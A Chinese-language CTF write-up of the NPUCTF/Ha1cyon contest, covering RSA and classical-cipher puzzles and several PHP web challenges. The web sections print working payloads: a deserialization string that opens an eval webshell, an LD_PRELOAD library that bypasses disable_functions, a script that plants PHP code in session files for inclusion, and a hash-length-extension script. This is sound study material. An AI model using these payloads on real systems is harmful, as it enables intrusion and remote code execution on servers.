---
title: Ha1cyonCTF WriteUp
date: 2020-04-22 18:08:50
categories:
  - CTF
---

最近搞的西工大CTF，整体题目感觉挺难的，看了WP之后发现Web还有一些很新的CVE，Misc还有音频隐写，都是没接触过的东西。除了服务器不定时的尿崩之外（运维挨打），做出来了几个题，也是第一次接触CTF的Crypto吧，记录一下收获。

<!-- more -->

# Misc

## 抽象带师

真就人均狗粉丝嗷（

![](https://hujiekang.top/images/uploads/big/cc99d4f3761a40880ecd569f2f0537f5.png)

Flag：`NPUCTF{欢迎来到西北工业大学CTF比赛世界上最简单的比赛}`

Misc就做出来一道。。。真的难

# Crypto

## 认清形势，建立信心

```python
from Crypto.Util.number import *
from gmpy2 import *
from secret import flag

p = getPrime(25)
e = # Hidden
q = getPrime(25)
n = p * q
m = bytes_to_long(flag.strip(b"npuctf{").strip(b"}"))

c = pow(m, e, n)
print(c)
print(pow(2, e, n))
print(pow(4, e, n))
print(pow(8, e, n))

'''
169169912654178
128509160179202
518818742414340
358553002064450
'''
```

一道RSA的题目，由于输出的数字大小也不是很大，后面一点一点做着也就做出来了。

首先`p`和`q`都是25bit的素数，然后给出了加密后的密文和另外三个密文。经工作室的小伙伴一提醒，发现可以利用同余的性质求解出n：

> 若正整数$a_1,a_2,b_1,b_2$满足$a_1\equiv a_2(mod\space m),\space \space b_1\equiv b_2(mod\space m)$，则$a_1b_1\equiv a_2b_2(mod\space m)$。

由题意可得下面的式子（令3个密文分别为$c_1,c_2,c_3$）：

$$\left \{  \begin{array}{c} 2^e(mod\space n)=c_1 \\  4^e(mod\space n)=c_2 \\  8^e(mod\space n)=c_3 \end{array} \right. \xRightarrow[]{2^e=u} \left \{  \begin{array}{c} u\equiv c_1(mod\space n) \\  u^2\equiv c_2(mod\space n) \\  u^3\equiv c_3(mod\space n) \end{array} \right.$$

于是就可以建立一组等式：

$$\left \{  \begin{array}{c} u^3\equiv u\times u^2\equiv c_1c_2\equiv c_3(mod\space n) \\  u^2\equiv u\times u\equiv c_1^2\equiv c_2(mod\space n) \\  u^3\equiv u\times u\times u\equiv c_1^3\equiv c_3(mod\space n) \end{array} \right.$$

由同余定义，得$n|c_1c_2-c_3,\space\space n|c_1^2-c_2,\space\space n|c_1^3-c_3$，也就是说这三个结果都是$n$的倍数。接下来如果想办法找到它们的公因数，就可以找到$n$了。（$n$是素数）

![](https://hujiekang.top/images/uploads/big/418c2a1116bd96aabc7abcb9d601bfaa.png)

果然我发现了这个网站：<http://www.factordb.com/index.php>，可以在线分解一个数找到它所有的因数。一遍操作得到下面的结果：

```bash
66672960872896203079532492230 = 2 · 5 · 18195301 · 28977097 · 12645488853859
16514604249963278194010942464 = 2^10 · 7 · 373 · 11715133 · 18195301 · 28977097
2122277922854727695321455521983198683925958 = 2 · 3 · 569 · 18195301 · 28977097 · 154996903 · 7606793031330667
```

发现了公因数$18195301$和$28977097$，都是素数，所以应该就是$p$和$q$了，验证一下，发现都是25bit，所以得到了$n$的值：$527247002021197$。

接下来就是求解$e$的值。写了一个Python脚本爆破，可能因为数据小吧，爆了半个小时直接爆出来了：

```python
for i in range(1, 1000000001):
    if i % 1000000 == 0:
        print("Start "+str(i))
    if pow(2, i, n) == 128509160179202 and pow(4, i, n) == 518818742414340 and pow(8, i, n) == 358553002064450:
        print(i)
```

![](https://hujiekang.top/images/uploads/big/2e93eba0ada91b7a922a26d143bb312a.png)

解出$e=808723997$。后面看到另一个师傅的WP，用了一个看不太懂的算法，以后慢慢琢磨：<http://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#认清形势建立信心>

然后常规求解$d\equiv e^{-1}(mod\space \phi(n))$，用扩展的欧几里得算法求解：

![](https://hujiekang.top/images/uploads/big/cf2a5a6116840b881b91b0da9178b143.png)

$d=-211826053314667(mod\space \phi(n))=315420901534133$，故明文$m=c^d(mod\space n)=219919251745$,转成字符串得到`345y!`，所以flag为`npuctf{345y!}`。

## 这是什么觅🐎

附件一个压缩包，解压下来只有一张图片：

![](https://hujiekang.top/images/uploads/medium/6209b0039e745f0cfe570f1c137095fa.jpg)

只有一步没想到。。。后来看了WP发现这么简单。。。

首先下面纸条上面的一行字，字母代表星期的首字母，由于周六和周日、周二和周四的首字母重复了（就这里没想到。。。），所以用`S1`、`S2`和`T1`、`T2`表示，于是就可以得到一串数字`3 1 12 5 14 4 1 18 `，映射到字母表得到flag为`flag{calendar}`。

## Classical Cipher

这题应该是古典密码，给了一个带密码的压缩包和一个txt：

> 解密后的flag请用flag{}包裹
>
> 压缩包密码：`gsv_pvb_rh_zgyzhs`
>
> 对应明文：   `***_key_**_******`

丢到[这个网站](https://quipqiup.com/)里面一解，发现用仅有的三个明文密文的对应关系，可以猜测到前面三个单词为`the key is`，于是再次求解，得到三个结果，一个一个试，发现密码是`the_key_is_atbash`。

搜索一下发现是Atbash密码，就是将字母表倒转之后形成的对应关系，比如`A->Z,B->Y……,Y->B,Z->A`，再根据这个进行加解密即可。

解开压缩包后拿到一张图片：

![](https://hujiekang.top/images/uploads/big/ce77157103878515865f8b2c409eddf7.png)

这是古埃及象形文字编码和猪圈密码的合体，对应字母的关系如下：

![](https://hujiekang.top/images/uploads/big/53ae7fb97297cdd95d9a84f15512f16c.jpg)

![](https://hujiekang.top/images/uploads/big/831c43fc1c602763f81f8191dbf2495b.jpg)

解出flag：`flag{classicalcode}`

# Web

## 查源码

最简单的题，网页屏蔽了F12和右键的操作，直接抓包或者加`view-source:`可以看见源代码拿到flag（忘记截图了，贴一张别人的）：

![](https://hujiekang.top/images/uploads/big/f8fb37aa3b5da7a433b38fc5c0910bbc.png)

## RealEzPHP

打开页面中什么信息也没有，于是查看源码，发现`time.php?source`，访问拿到PHP源码：

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

是一道反序列化的题目，然后有命令执行，于是本地构造序列化字符串，一开始试`system()`、`shell_exec()`啥的都没有反应，然后试了`file_get_contents()`可以执行，于是再试了一下`phpinfo()`：`O:8:"HelloPhp":2:{s:1:"a";i:-1;s:1:"b";s:7:"phpinfo";}`，直接在`phpinfo()`中找到flag：

![](https://hujiekang.top/images/uploads/big/ce67ce86edf9ee91a3487ccde5319108.png)

当然我一开始肯定不是这样做的。。。不然就不会有后面的东西了

无意间瞥到`disable_functions`中禁用了一大堆函数：

![](https://hujiekang.top/images/uploads/big/94e74b9d0a16c3c0abc4705f5c418f2c.png)

然后又灵光一现，去试了一下`eval()`和`assert()`，`eval`由于是语言结构不能用在可变函数上，但是可以`assert(eval(code))`来执行任意PHP代码。于是构造字符串`O:8:"HelloPhp":2:{s:1:"a";s:19:"eval($_POST["aaa"])";s:1:"b";s:6:"assert";}`，就可以挂蚁剑了，可以上传文件，只不过一大堆命令执行不了，还是有很多限制。

于是就想去绕过`disable_functions`的限制来getshell。搜了半天搜到这个<https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>，使用Linux系统的环境变量`LD_PRELOAD`劫持系统函数，从而实现绕过`disable_functions`限制实现任意命令执行。大概原理就是用C/C++写动态链接库`.so`，里面定义和一些系统函数同名的函数，写入恶意内容，再通过间接的调用这些函数来实现。

里面大概说的就是PHP里面的`mail()`和`error_log()`函数都会执行系统函数`getuid()`，因此只需要重写`getuid()`的代码，再编译成共享链接库，传到网站上去，就可以了。

这篇文章说的很详细了:<https://xz.aliyun.com/t/4623>，我用之前的那个发现还是没有反应，可能是因为上面那个只用了`mail()`的原因吧。后面参考使用了`error_log()`函数（要求type为1），成功执行了命令：

```php
<?php
putenv("LD_PRELOAD=./test.so");
error_log("test",1,"","");  // type = 1
?>
```

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
    system("ls > test.txt");
}   
int  geteuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

![](https://hujiekang.top/images/uploads/big/561ea082aab6c798b87be77da73504b8.png)

然后我又折腾了一番，发现蚁剑有现成的插件可以用。。。&#x1F602;用起来挺方便的，直接生成了一个不受限制的PHP文件，直接访问就可以拿到webshell了：

![](https://hujiekang.top/images/uploads/big/f6ded5acf828554f19e1be2780f5860b.png)

![](https://hujiekang.top/images/uploads/big/653229af21ae4788b14fd7d19a9ca952.png)

然后`cat /FIag_!S_it`，拿到假flag：`NPUCTF{this_is_not_a_fake_flag_but_true_flag}`

然后就没有然后了。。。。。当时找flag找自闭了。。。

## 超简单的PHP！！！超简单！！！

打开页面，和前一题一模一样，然后在源码里面发现位置`index.bak.php`，访问之后弹出来一个留言板，此时发现可疑参数`action`，估计是有文件包含（真就抽象呗）：

![](https://hujiekang.top/images/uploads/big/cafbc6e0637b10aa7c19cfbe3192ed76.png)

先到处看了一下，Index就是之前的首页，然后还有一个tips会显示phpinfo，看了一下Message的源码，发现POST消息到`msg.php`：

```javascript
$.get("./msg.php",function(rst){flash(rst);})
$("#sendMsg").click(function(){
    txt=$("#msg").val();
    $.post("./msg.php",{msg:txt},function(rst){flash(rst);});
});
```

于是就借助参数`action`，试了一下伪协议，成功使用`php://filter/read=convert.base64-encode/resource=`读到所有文件的源码。

首先是`index.bak.php`：

```php
<?php 
session_start();
if(isset($_GET['action'])){
    include $_GET['action'];
    exit();
} else {
    header("location:./index.bak.php?action=message.php");
}
```

`msg.php`：

```php
<?php 
header('content-type:application/json');
session_start();
function safe($msg){
    if (strlen($msg)>17){
        return "msg is too loooong!";
    } else {
        return preg_replace("/php/","?",$msg);
    }
}

if (!isset($_SESSION['msg'])&empty($_SESSION['msg']))$_SESSION['msg'] = array();

if (isset($_POST['msg']))
{

    array_push($_SESSION['msg'], ['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]);
    echo json_encode(array(['msg'=>safe($_POST['msg']),'time'=>date('Y-m-d H:i:s',time())]));
    exit();
}
if(!empty($_SESSION['msg'])){
    echo json_encode($_SESSION['msg']);
} else {echo "还不快去留言！";}
?>
```

发现留言的内容会被保存在session中，而保存在session中就意味着会以序列化对象的形式保存在session的临时文件（位于`/tmp`）里面，再加上上面的文件包含，就可以实现任意命令执行了。

关于PHP的session序列化方式，在[另一篇文章](/2020/03/10/jarvisoj-wp/#phpinfo)里面有提到。当然在这也不是重点，重点是往里面填入PHP代码。

`msg.php`里面有限制，要求传入消息的长度不能大于17，而且屏蔽了php关键字，因此不能一次性写所有命令，要分开写。参考了一下其他师傅的WP，可以使用换行符`\n`+注释`#`来实现，也可以在非代码的地方包上`/**/`来实现，以下是代码：

```python
import requests

session = requests.session()

url = "http://39.101.167.56:28028/msg.php"
cookies = {"session": "6ae17247-53f3-4ac4-b419-fb63814ecc28.Ty_3FbzG99sbFHyITrswaOuq1ek", "PHPSESSID": "hd36m74o0s6g5ce7fhv8lcef85"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://ha1cyon-ctf.fun:30135/index.bak.php?action=message.php", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}

data = {"msg": "<?PhP \n#"}  # data = {"msg": "<?PhP /*"}
session.post(url, headers=headers, cookies=cookies, data=data)

data = {"msg": "\n$a=$_GET;#"}  # data = {"msg": "*/$a=$_GET;/*"}
session.post(url, headers=headers, cookies=cookies, data=data)

data = {"msg": "\neval($a[1]);#"}  # data = {"msg": "*/eval($a[1]);/*"}
session.post(url, headers=headers, cookies=cookies, data=data)

data = {"msg": "\n ?>"}  # data = {"msg": "*/ ?>"}
session.post(url, headers=headers, cookies=cookies, data=data)

url = "http://39.101.167.56:28028/index.bak.php?action=/tmp/sess_hd36m74o0s6g5ce7fhv8lcef85&1=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"
r=session.get(url, headers=headers, cookies=cookies)
print(r.text)
```

如上面代码所示，最后将session文件包含进来，然后执行任意命令，phpinfo里面禁用了`system()`等等一些函数，所以使用`scandir()`来获取文件目录，再`file_get_contents()`拿到flag：

![](https://hujiekang.top/images/uploads/big/414f8bafa3f8bd25b3ee7050e2571aed.png)

由于是在复现环境下，再贴一个session文件的内容吧：

![](https://hujiekang.top/images/uploads/big/94d7fa00068a542c8b39ec764fbd7a8f.png)

flag：`NPUCTF{this_is_not_fl4g_it_is_flag}`

后来看另一个师傅的WP，发现还有一种思路：<[https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/](https://coomrade.github.io/2018/10/26/文件包含的一些getshell姿势/)>

大概就是说，当存在包含文件的地方使用`php://filter/string.strip_tags`会造成Segment Fault返回500（要求PHP<7.2）：

![](https://hujiekang.top/images/uploads/big/1b840bc1010b620c025f3005992019f4.png)

而如果同时上传一个任意文件上去的话，会被永久的存在PHP的临时文件目录。下面是我复现的结果：

构造文件上传：

```html
<form action="http://39.101.167.56:28028/index.bak.php?action=php://filter/string.strip_tags/resource=msg.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

然后写个马传上去，显然是没有反应的，所以BurpSuite返回`No response received from remote server.`

![](https://hujiekang.top/images/uploads/big/61abe52c77e3ee307c60381adccdab02.png)

然后去查看靶机的临时目录，发现文件就在里面：

![](https://hujiekang.top/images/uploads/big/443c7c95e832bcebc1737c725426b199.png)

可以看见，上传的文件名是有一定规律的：`php+6位字母/数字`，成本稍微有点大，但是也不是不可以，所以在实际环境下，这里就选择爆破了（Intruder给的爆破量是`965660736`）：

![](https://hujiekang.top/images/uploads/big/3290274978a886975cff95ccd88156fe.png)

这样就是花的时间长一点。。。别的也还行

## ezinclude

打开页面显示`username/password error`，查看源码发现注释`<!--md5($secret.$name)===$pass -->`，故想到Hash长度扩展攻击。四处翻看，在Cookie里面找到Hash值。

Hashpump一把梭：

```python
import os
import requests
import hashpumpy
import urllib.parse

url = "http://fbe86dba-df41-4b99-8347-e473f69745cf.node3.buuoj.cn"
md5 = "973225ae4fc8977f86d1a330b0774630"

for i in range(65):
    passwd, name = hashpumpy.hashpump(md5, "admin", "admin", i)
    print(i, passwd, name)
    r = requests.get(url+"?name="+urllib.parse.quote(name)+"&pass="+passwd)
    if "error" not in r.text:
        print(r.text)
        break
```

查看输出，找到`flflflflag.php`：

![](https://hujiekang.top/images/uploads/big/f1a4631b270e16a01b0826594f42d217.png)

（后面看了PHP源码才知道，默认`name`为空，所以输出的Hash值就已经满足`md5($secret.$name)===$pass`的要求，所以只需要直接填入`pass`即可。）

浏览器访问`flflflflag.php`直接跳转到404页面，估计用了JS做跳转，所以用curl，拿到hint`include($_GET["file"])`。

尝试了一波，发现做了一些过滤，但是`php://filter/read=convert.base64-encode/resource=`可以用，于是可以读出所有文件的源码，发现果然过滤了一些关键字：

```php
<?php
    $file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
    die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
```

于是后续就可以直接用上面的`php://filter/string.strip_tags`来上传文件了。后来看官方WP发现有个`dir.php`，可以展示`/tmp`目录下的文件名，也就是说不需要爆破，直接可以包含。

![](https://hujiekang.top/images/uploads/big/2f5bda6a2424c9fadc2f63587e424d48.png)

后面的套路就和上面两题类似了，写马上传文件，最后在phpinfo里找到flag：

![](https://hujiekang.top/images/uploads/big/284e861671543dcfcacbe66d5df1e996.png)